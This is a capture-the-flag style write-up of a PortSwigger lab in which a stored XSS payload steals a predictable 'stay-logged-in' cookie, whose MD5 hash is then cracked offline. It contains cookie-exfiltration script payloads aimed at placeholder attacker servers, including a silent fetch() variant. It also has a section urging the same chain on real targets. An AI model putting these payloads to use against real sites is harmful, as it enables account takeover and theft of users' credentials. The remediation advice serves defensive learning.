# Offline Password Cracking

**Platform:** PortSwigger Web Security Academy  
**Category:** Authentication  
**Difficulty:** Practitioner  
**Date Solved:** 2026-09-17  
**Severity:** High

## Summary

The application sets a predictable `stay-logged-in` cookie constructed as `base64(username:md5(password))`. A stored XSS vulnerability in the blog comment section allows injecting a payload that exfiltrates Carlos's cookie to an attacker-controlled server. The cookie is then decoded offline using CyberChef to extract the MD5 hash, which is cracked instantly using CrackStation's 15GB wordlist. Full account takeover achieved without ever knowing the victim's password directly.

## Affected Components

1. `stay-logged-in` cookie — predictable formula: `base64(username:md5(password))`
2. Blog comment section — stored XSS, no input sanitisation
3. Combined: cookie theft via XSS → offline hash cracking → ATO

## Two Key Tools Learned

### CyberChef
**What:** Swiss army knife for encoding/decoding/transforming data
**Use:** Decode base64 cookies, detect encoding, transform data
**Get it:** https://github.com/gchq/CyberChef/releases
- Download the zip → extract → open `.html` file locally
- Works fully offline — no install needed
- Bookmark it, you'll use it on every real target

### CrackStation
**What:** Free online hash cracker with 15GB wordlist (1.4 billion passwords)
**Use:** Paste any md5/sha1/sha256 hash → get plaintext password instantly
**URL:** https://crackstation.net
- Supports: MD5, SHA1, SHA256, SHA512, NTLM and more
- Works for unsalted hashes only
- Bookmark it alongside CyberChef

## Steps to Reproduce

### Step 1 — Identify the cookie formula

Log in with "Remember me" ticked → copy `stay-logged-in` cookie → CyberChef base64 decode:
```
Input:  d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
Output: wiener:51dc30ddc473d43a6011e9ebba6ca770
Formula confirmed: base64(username:md5(password))
```

### Step 2 — Steal Carlos's cookie via XSS

Inject into blog comment field:
```javascript
<script>document.location='https://YOUR-EXPLOIT-SERVER/exploit?c='+document.cookie</script>
```

Wait for Carlos to visit → check exploit server access log → find his cookie:
```
GET /exploit?c=secret=xxx;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

### Step 3 — Decode the cookie

```python
import base64
cookie = "Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz"
padding = 4 - len(cookie) % 4
if padding != 4:
    cookie += "=" * padding
decoded = base64.b64decode(cookie).decode()
# Output: carlos:26323c16d5f4dabff3bb136f2460a943
```

Or use CyberChef → From Base64 → paste cookie → output shows `carlos:hash`

### Step 4 — Crack the hash

Go to **crackstation.net** → paste `26323c16d5f4dabff3bb136f2460a943` → crack:
```
Hash: 26323c16d5f4dabff3bb136f2460a943
Type: md5
Result: onceuponatime 
```

### Step 5 — Complete objective

Login as `carlos:onceuponatime` → My Account → Delete Account → lab solved ✅

## Proof of Concept

**Access log showing Carlos's cookie:**

[Script to decode the cookie to find formula](https://github.com/MalikHettige/Scripts-tools/blob/main/authentication/Offline%20Password%20Cracking/cookie-decode.py)

[Script to forge + brute force for target username](https://github.com/MalikHettige/Scripts-tools/blob/main/authentication/Offline%20Password%20Cracking/cookie-brute.py)
```
10.0.3.98 "GET /exploit?c=secret=xxx;%20stay-logged-in=Y2FybG9z..."
          user-agent: Mozilla/5.0 (Victim)
```

**Decoded cookie:** `carlos:26323c16d5f4dabff3bb136f2460a943`

**CrackStation result:** `onceuponatime`

<img width="1919" height="403" alt="image" src="https://github.com/user-attachments/assets/3868cd1a-8db8-4418-bd06-e75eeda538f4" />

## Real World Application

**How to find this on real targets:**

```
1. Log in with "Remember me" → copy cookie → CyberChef decode
2. Is it readable? (contains username, hash, timestamp?) → predictable
3. Find ANY XSS on the same domain (stored XSS = best)
4. Inject cookie-stealing payload → wait for victim
5. Decode stolen cookie → CrackStation → crack hash → login
```

**XSS cookie theft payload:**
```javascript
<script>document.location='https://YOUR-SERVER/?c='+document.cookie</script>
```

Or silently (doesn't redirect victim):
```javascript
<script>fetch('https://YOUR-SERVER/?c='+document.cookie)</script>
```

**Where to host your collector:**
- Burp Collaborator (Burp Pro)
- PortSwigger exploit server (labs only)
- Your own VPS with a simple Python HTTP server
- Webhook.site (free, instant)

**Real world chain severity:**
```
Stored XSS alone          → Medium
Predictable cookie alone  → Medium  
Both chained              → High/Critical (full ATO)
```

## Script Names

```
cookie-decode.py    → decode your own stay-logged-in cookie to find formula
cookie-brute.py     → forge + brute force cookies for target username
```

For offline cracking specifically — no script needed:
CyberChef (decode) + CrackStation (crack) handles it in under 2 minutes manually.

## Impact

### Technical
- Full ATO on carlos achieved without knowing his password
- Attack is entirely offline until final login — no server logs during cracking
- XSS payload executes silently in victim's browser
- md5 hashes crack instantly on CrackStation for common passwords

### Business / Real-World
- Two separate vulnerabilities chained = amplified impact
- Victim has no indication of compromise
- Cookie theft bypasses 2FA, rate limiting, and all login protections
- In production: admin accounts, payment data, PII all at risk

## Remediation

1. **Cryptographically random tokens** — never derive cookies from user data
2. **Sanitise all user input** — encode HTML entities in comment fields
3. **HttpOnly flag** — prevents JavaScript from reading cookies entirely
   ```
   Set-Cookie: stay-logged-in=xxx; HttpOnly; Secure; SameSite=Strict
   ```
4. **Strong hashing** — never use MD5/SHA1 for passwords; use bcrypt/argon2
5. **Content Security Policy** — restricts where scripts can send data

## Lessons Learned

- XSS + predictable cookie = two mediums become one critical
- CyberChef and CrackStation are essential tools — bookmark both
- HttpOnly cookie flag would have completely stopped this attack
- Offline attacks leave no server-side trace until the final login
- Always check "Remember me" cookies on real targets — decode first, analyse formula

## Methodology Entry

```
### Offline Cookie Cracking (XSS + Hash)
WHERE:  predictable cookie + XSS injection point (comments, profile, bio)
WHAT:   inject fetch/redirect payload → exploit server access log
        → CyberChef decode → CrackStation crack → login
SIGNAL: victim IP hits exploit server with cookie in query string
TOOLS:  CyberChef (decode) + CrackStation (crack)
SILENT: use fetch() instead of document.location to avoid redirecting victim
```

## References

- [PortSwigger Lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [CrackStation](https://crackstation.net)
- [PortSwigger — XSS](https://portswigger.net/web-security/cross-site-scripting)

**Tags:** `#PortSwigger` `#Authentication` `#XSS` `#CookieCracking` `#MD5` `#CyberChef` `#CrackStation` `#Practitioner`
